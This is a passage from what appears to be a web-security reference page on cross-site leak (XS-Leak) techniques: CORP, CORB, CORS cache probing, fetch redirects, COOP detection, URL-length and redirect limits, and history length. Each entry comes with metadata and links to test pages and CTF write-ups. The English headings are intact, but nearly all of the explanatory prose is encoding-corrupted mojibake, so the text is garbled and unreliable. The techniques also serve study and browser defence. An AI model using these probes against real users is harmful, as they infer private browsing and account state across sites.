* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Header
* **More info**: [**https://xsleaks.dev/docs/attacks/browser-features/corp/**](https://xsleaks.dev/docs/attacks/browser-features/corp/)
* **Summary:** рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рд╕рдВрд╕рд╛рдзрди рдиреАрддрд┐ (CORP) рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди рдПрдХ рдЕрд╕реНрд╡реАрдХреГрдд рдореВрд▓ рд╕реЗ рд▓рд╛рдП рдЬрд╛рдиреЗ рдкрд░ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдВрдЧреЗред
* **Code Example**: [https://xsinator.com/testing.html#CORP%20Leak](https://xsinator.com/testing.html#CORP%20Leak)

CORP рд╣реЗрдбрд░ рдПрдХ рдЕрдкреЗрдХреНрд╖рд╛рдХреГрдд рдирдпрд╛ рд╡реЗрдм рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╕реБрд░рдХреНрд╖рд╛ рдлреАрдЪрд░ рд╣реИ рдЬреЛ рд╕реЗрдЯ рд╣реЛрдиреЗ рдкрд░ **рджрд┐рдП рдЧрдП рд╕рдВрд╕рд╛рдзрди рдХреЗ рд▓рд┐рдП рдиреЛ-CORS рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЕрдиреБрд░реЛрдзреЛрдВ рдХреЛ рдЕрд╡рд░реБрджреНрдз рдХрд░рддрд╛ рд╣реИ**ред рд╣реЗрдбрд░ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ CORP рдХреЗ рд╕рд╛рде рд╕реБрд░рдХреНрд╖рд┐рдд рд╕рдВрд╕рд╛рдзрди **рд▓рд╛рдП рдЬрд╛рдиреЗ рдкрд░ рддреНрд░реБрдЯрд┐ рдлреЗрдВрдХреЗрдВрдЧреЗ**ред

### CORB

* **Inclusion Methods**: HTML Elements
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header](https://xsleaks.dev/docs/attacks/browser-features/corb/#detecting-the-nosniff-header)
* **Summary**: CORB рд╣рдорд▓рд╛рд╡рд░реЛрдВ рдХреЛ рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ **`nosniff` рд╣реЗрдбрд░ рдЕрдиреБрд░реЛрдз рдореЗрдВ рдореМрдЬреВрдж рд╣реИ**ред
* **Code Example**: [https://xsinator.com/testing.html#CORB%20Leak](https://xsinator.com/testing.html#CORB%20Leak)

рд╣рдорд▓реЗ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП рд▓рд┐рдВрдХ рджреЗрдЦреЗрдВред

### CORS error on Origin Reflection misconfiguration <a href="#cors-error-on-origin-reflection-misconfiguration" id="cors-error-on-origin-reflection-misconfiguration"></a>

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Headers
* **More info**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)
* **Summary**: рдпрджрд┐ Origin рд╣реЗрдбрд░ рдХреЛ `Access-Control-Allow-Origin` рд╣реЗрдбрд░ рдореЗрдВ рдкрд░рд╛рд╡рд░реНрддрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд╕рдВрд╕рд╛рдзрди рдкрд╣рд▓реЗ рд╕реЗ рдХреИрд╢ рдореЗрдВ рд╣реИред
* **Code Example**: [https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration](https://xsleaks.dev/docs/attacks/cache-probing/#cors-error-on-origin-reflection-misconfiguration)

рдпрджрд┐ **Origin рд╣реЗрдбрд░** рдХреЛ `Access-Control-Allow-Origin` рд╣реЗрдбрд░ рдореЗрдВ **рдкрд░рд╛рд╡рд░реНрддрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ **CORS** рдореЛрдб рдореЗрдВ **рд╕рдВрд╕рд╛рдзрди рдХреЛ рд▓рд╛рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ **рддреНрд░реБрдЯрд┐** **рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ**, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕реЗ **рд╡реЗрдм рд╕реЗ рд╕рд╣реА рддрд░реАрдХреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛**, рдпрджрд┐ рддреНрд░реБрдЯрд┐ **рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддреА рд╣реИ**, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЗрд╕реЗ **рдХреИрд╢ рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛** (рддреНрд░реБрдЯрд┐ рдЗрд╕рд▓рд┐рдП рдкреНрд░рдХрдЯ рд╣реЛрддреА рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреИрд╢ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЛ CORS рд╣реЗрдбрд░ рдХреЗ рд╕рд╛рде рдмрдЪрд╛рддрд╛ рд╣реИ рдЬреЛ рдореВрд▓ рдбреЛрдореЗрди рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ рдФрд░ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рдбреЛрдореЗрди рдХреА рдирд╣реАрдВ)**ред\
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрджрд┐ рдореВрд▓ рдкрд░рд╛рд╡рд░реНрддрд┐рдд рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдПрдХ рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (`Access-Control-Allow-Origin: *`), рддреЛ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ред

## Readable Attributes Technique

### Fetch Redirect

* **Inclusion Methods**: Fetch API
* **Detectable Difference**: Status Code
* **More info**: [https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html](https://web-in-security.blogspot.com/2021/02/security-and-privacy-of-social-logins-part3.html)
* **Summary:** GC рдФрд░ SA рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рдХрд╛рд░ (opaque-redirect) рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#Fetch%20Redirect%20Leak](https://xsinator.com/testing.html#Fetch%20Redirect%20Leak)

`redirect: "manual"` рдФрд░ рдЕрдиреНрдп рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рд╕рд╛рде Fetch API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдПрдХ рдЕрдиреБрд░реЛрдз рд╕рдмрдорд┐рдЯ рдХрд░рдиреЗ рдкрд░, `response.type` рд╡рд┐рд╢реЗрд╖рддрд╛ рдХреЛ рдкрдврд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдФрд░ рдпрджрд┐ рдпрд╣ `opaqueredirect` рдХреЗ рдмрд░рд╛рдмрд░ рд╣реИ, рддреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдПрдХ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдереАред

### COOP

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Header
* **More info**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.4), [https://xsleaks.dev/docs/attacks/window-references/](https://xsleaks.dev/docs/attacks/window-references/)
* **Summary:** рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдУрдкрдирд░ рдиреАрддрд┐ (COOP) рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рдкреГрд╖реНрда рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдЗрдВрдЯрд░реИрдХреНрд╢рди рд╕реЗ рдкрд╣реБрдВрдЪ рдХреЛ рд░реЛрдХрддреЗ рд╣реИрдВред
* **Code Example**: [https://xsinator.com/testing.html#COOP%20Leak](https://xsinator.com/testing.html#COOP%20Leak)

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди HTTP рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреНрд░реЙрд╕-рдУрд░рд┐рдЬрд┐рди рдУрдкрдирд░ рдиреАрддрд┐ (COOP) рд╣реЗрдбрд░ рдХреА рдЙрдкрд╕реНрдерд┐рддрд┐ рдХрд╛ рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддрд╛ рд╣реИред COOP рдХрд╛ рдЙрдкрдпреЛрдЧ рд╡реЗрдм рдЕрдиреБрдкреНрд░рдпреЛрдЧреЛрдВ рджреНрд╡рд╛рд░рд╛ рдмрд╛рд╣рд░реА рд╕рд╛рдЗрдЯреЛрдВ рдХреЛ рдордирдорд╛рдиреЗ рд╡рд┐рдВрдбреЛ рд╕рдВрджрд░реНрдн рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рд╕реЗ рд░реЛрдХрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рд╣реЗрдбрд░ рдХреА рджреГрд╢реНрдпрддрд╛ рдХреЛ **`contentWindow` рд╕рдВрджрд░реНрдн** рддрдХ рдкрд╣реБрдВрдЪрдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░рдХреЗ рдкрд╣рдЪрд╛рдирд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрди рдкрд░рд┐рджреГрд╢реНрдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ COOP рдХреЛ рд╢рд░реНрддреЛрдВ рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, **`opener` рдкреНрд░реЙрдкрд░реНрдЯреА** рдПрдХ рд╕реНрдкрд╖реНрдЯ рд╕рдВрдХреЗрддрдХ рдмрди рдЬрд╛рддреА рд╣реИ: рдпрд╣ COOP рд╕рдХреНрд░рд┐рдп рд╣реЛрдиреЗ рдкрд░ **undefined** рд╣реЛрддреА рд╣реИ, рдФрд░ рдЗрд╕рдХреЗ рдЕрднрд╛рд╡ рдореЗрдВ **defined** рд╣реЛрддреА рд╣реИред

### URL Max Length - Server Side

* **Inclusion Methods**: Fetch API, HTML Elements
* **Detectable Difference**: Status Code / Content
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects](https://xsleaks.dev/docs/attacks/navigations/#server-side-redirects)
* **Summary:** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рд▓рдВрдмрд╛рдИ рдХреЗ рдХрд╛рд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬреЛ рдЗрддрдиреА рдмрдбрд╝реА рд╣реЛ рд╕рдХрддреА рд╣реИ рдХрд┐ рд╕рд░реНрд╡рд░ рддреНрд░реБрдЯрд┐ рдХреЗ рд╕рд╛рде рдкреБрдирдГ рдЦреЗрд▓рддрд╛ рд╣реИ рдФрд░ рдПрдХ рдЕрд▓рд░реНрдЯ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#URL%20Max%20Length%20Leak](https://xsinator.com/testing.html#URL%20Max%20Length%20Leak)

рдпрджрд┐ рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ** рдФрд░ **рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред рдЗрд╕ рд╡реНрдпрд╡рд╣рд╛рд░ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рд╕рд╛рдорд╛рдиреНрдпрддрдГ **рд╕рд░реНрд╡рд░** рдХреА **рд╕реАрдорд╛ рдЕрдиреБрд░реЛрдз рд▓рдВрдмрд╛рдИ** рд╣реЛрддреА рд╣реИред рдпрджрд┐ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдбреЗрдЯрд╛** **рд▓рдВрдмрд╛рдИ - 1** рд╣реИ, рдХреНрдпреЛрдВрдХрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢** **рдЙрд╕ рдбреЗрдЯрд╛** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд░рд╣рд╛ рд╣реИ рдФрд░ **рдХреБрдЫ рдЕрддрд┐рд░рд┐рдХреНрдд рдЬреЛрдбрд╝ рд░рд╣рд╛ рд╣реИ**, рддреЛ рдпрд╣ **рддреНрд░реБрдЯрд┐ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдЧрд╛ рдЬрд┐рд╕реЗ рддреНрд░реБрдЯрд┐ рдШрдЯрдирд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдпрджрд┐ рдЖрдк рдХрд┐рд╕реА рддрд░рд╣ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреБрдХреАрдЬрд╝ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЗрд╕ рд╣рдорд▓реЗ рдХреЛ **рдкрд░реНрдпрд╛рдкреНрдд рдХреБрдХреАрдЬрд╝ рд╕реЗрдЯ рдХрд░рдХреЗ** рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ ([**рдХреБрдХреА рдмрдо**](hacking-with-cookies/cookie-bomb.md)) рддрд╛рдХрд┐ **рд╕рд╣реА рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЗ **рдмрдврд╝реЗ рд╣реБрдП рдЖрдХрд╛рд░** рдХреЗ рд╕рд╛рде рдПрдХ **рддреНрд░реБрдЯрд┐** рдЯреНрд░рд┐рдЧрд░ рд╣реЛред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдпрд╛рдж рд░рдЦреЗрдВ рдХрд┐ рдпрджрд┐ рдЖрдк рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдХ рд╣реА рд╕рд╛рдЗрдЯ рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░рддреЗ рд╣реИрдВ, рддреЛ `<script>` рд╕реНрд╡рдЪрд╛рд▓рд┐рдд рд░реВрдк рд╕реЗ рдХреБрдХреАрдЬрд╝ рднреЗрдЬреЗрдЧрд╛ (рддрд╛рдХрд┐ рдЖрдк рддреНрд░реБрдЯрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХреЗрдВ)ред\
**рдХреБрдХреА рдмрдо + XS-Search** рдХрд╛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдЗрд╕ рд▓реЗрдЦ рдХреЗ рдЗрд░рд╛рджрд┐рдд рд╕рдорд╛рдзрд╛рди рдореЗрдВ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ: [https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended](https://blog.huli.tw/2022/05/05/en/angstrom-ctf-2022-writeup-en/#intended)

`SameSite=None` рдпрд╛ рдПрдХ рд╣реА рд╕рдВрджрд░реНрдн рдореЗрдВ рд╣реЛрдирд╛ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдХреЗ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП рд╕рд╛рдорд╛рдиреНрдпрддрдГ рдЖрд╡рд╢реНрдпрдХ рд╣реИред

### URL Max Length - Client Side

* **Inclusion Methods**: Pop-ups
* **Detectable Difference**: Status Code / Content
* **More info**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **Summary:** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХреА рд▓рдВрдмрд╛рдИ рдХреЗ рдХрд╛рд░рдг рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдУрдВ рдореЗрдВ рднрд┐рдиреНрдирддрд╛рдУрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ, рдЬреЛ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдмрдбрд╝реА рд╣реЛ рд╕рдХрддреА рд╣реИ рдХрд┐ рдПрдХ рднрд┐рдиреНрдирддрд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* **Code Example**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

[Chromium рджрд╕реНрддрд╛рд╡реЗрдЬрд╝](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url_display_guidelines/url_display_guidelines.md#URL-Length) рдХреЗ рдЕрдиреБрд╕рд╛рд░, Chrome рдХреА рдЕрдзрд┐рдХрддрдо URL рд▓рдВрдмрд╛рдИ 2MB рд╣реИред

> рд╕рд╛рдорд╛рдиреНрдпрддрдГ, _рд╡реЗрдм рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо_ URL рдХреА рд▓рдВрдмрд╛рдИ рдкрд░ рд╕реАрдорд╛рдПрдБ рдирд╣реАрдВ рд░рдЦрддрд╛ (рд╣рд╛рд▓рд╛рдВрдХрд┐ 2^31 рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рд╕реАрдорд╛ рд╣реИ)ред _Chrome_ рд╡реНрдпрд╛рд╡рд╣рд╛рд░рд┐рдХ рдХрд╛рд░рдгреЛрдВ рд╕реЗ рдФрд░ рдЕрдВрддрдГрдкреНрд░рдХреНрд░рд┐рдпрд╛ рд╕рдВрдЪрд╛рд░ рдореЗрдВ рд╕реЗрд╡рд╛ рд╕реЗ рдЗрдирдХрд╛рд░ рдХреА рд╕рдорд╕реНрдпрд╛рдУрдВ рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП URLs рдХреЛ рдЕрдзрд┐рдХрддрдо рд▓рдВрдмрд╛рдИ **2MB** рддрдХ рд╕реАрдорд┐рдд рдХрд░рддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП рдпрджрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ URL рдореЗрдВ рдПрдХ рдорд╛рдорд▓реЗ рдореЗрдВ рдмрдбрд╝рд╛ рдЙрддреНрддрд░ рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ**, рддреЛ рдЗрд╕реЗ **2MB рд╕реЗ рдмрдбрд╝рд╛ URL** рдХреЗ рд╕рд╛рде рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рддрд╛рдХрд┐ **рд▓рдВрдмрд╛рдИ рд╕реАрдорд╛** рдХреЛ рд╣рд┐рдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред рдЬрдм рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ Chrome рдПрдХ **`about:blank#blocked`** рдкреГрд╖реНрда рджрд┐рдЦрд╛рддрд╛ рд╣реИред

**рдзреНрдпрд╛рди рджреЗрдиреЗ рдпреЛрдЧреНрдп рднрд┐рдиреНрдирддрд╛** рдпрд╣ рд╣реИ рдХрд┐ рдпрджрд┐ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢** **рдкреВрд░реНрдг** рдерд╛, рддреЛ `window.origin` рдПрдХ **рддреНрд░реБрдЯрд┐** рдлреЗрдВрдХрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдПрдХ рдХреНрд░реЙрд╕ рдУрд░рд┐рдЬрд┐рди рдЙрд╕ рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рд╕рдХрддрд╛ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдпрджрд┐ **рд╕реАрдорд╛** рд╣рд┐рдЯ рдХреА рдЧрдИ рдереА рдФрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЧрдпрд╛ рдкреГрд╖реНрда **`about:blank#blocked`** рдерд╛, рддреЛ рд╡рд┐рдВрдбреЛ рдХрд╛ **`origin`** рдореВрд▓ рдХреЗ рд░реВрдк рдореЗрдВ рдмрдирд╛ рд░рд╣рддрд╛ рд╣реИ, рдЬреЛ рдПрдХ **рд╕реБрд▓рдн рдЬрд╛рдирдХрд╛рд░реА** рд╣реИред

**2MB** рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрд╡рд╢реНрдпрдХ рд╕рднреА рдЕрддрд┐рд░рд┐рдХреНрдд рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкреНрд░рд╛рд░рдВрднрд┐рдХ URL рдореЗрдВ рдПрдХ **рд╣реИрд╢** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЬреЛрдбрд╝рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЗрд╕реЗ **рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рдореЗрдВ** рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Max Redirects

* **Inclusion Methods**: Fetch API, Frames
* **Detectable Difference**: Status Code
* **More info**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3_0_76)
* **Summary:** рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢ рд╕реАрдорд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ URL рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреА рдШрдЯрдирд╛ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд░реЗрдВред
* **Code Example**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

рдпрджрд┐ рдПрдХ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрдХреНрд░рдорд┐рдд** рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢реЛрдВ рдХреА рдЕрдзрд┐рдХрддрдо рд╕рдВрдЦреНрдпрд╛ **20** рд╣реИ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ **19 рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢реЛрдВ** рдХреЗ рд╕рд╛рде рдЕрдкрдиреЗ рдкреГрд╖реНрда рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдЕрдВрддрддрдГ **рдкреАрдбрд╝рд┐рдд рдХреЛ** рдкрд░реАрдХреНрд╖рдг рдХрд┐рдП рдЧрдП рдкреГрд╖реНрда рдкрд░ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИред рдпрджрд┐ рдПрдХ **рддреНрд░реБрдЯрд┐** рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддреА рд╣реИ, рддреЛ рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдкреГрд╖реНрда **рдкреАрдбрд╝рд┐рдд рдХреЛ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рд┐рдд** рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рдерд╛ред

### History Length

* **Inclusion Methods**: Frames, Pop-ups
* **Detectable Difference**: Redirects
* **More info**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **Summary:** JavaScript рдХреЛрдб рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдЗрд╕реЗ рд▓рдВрдмрд╛рдИ рдкреНрд░реЙрдкрд░реНрдЯреА рджреНрд╡рд╛рд░рд╛ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **Code Example**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

**History API** JavaScript рдХреЛрдб рдХреЛ рдмреНрд░рд╛рдЙрдЬрд╝рд░ рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬреЛ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рджреЗрдЦреЗ рдЧрдП рдкреГрд╖реНрдареЛрдВ рдХреЛ рд╕рд╣реЗрдЬрддрд╛ рд╣реИ**ред рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рд▓рдВрдмрд╛рдИ рдкреНрд░реЙрдкрд░реНрдЯреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рд╕рдорд╛рд╡реЗрд╢рди рд╡рд┐рдзрд┐ рдХреЗ рд░реВрдк рдореЗрдВ рдХрд░ рд╕рдХрддрд╛ рд╣реИ: JavaScript рдФрд░ HTML рдиреЗрд╡рд┐рдЧреЗрд╢рди рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдиреЗ рдХреЗ рд▓рд┐рдПред\
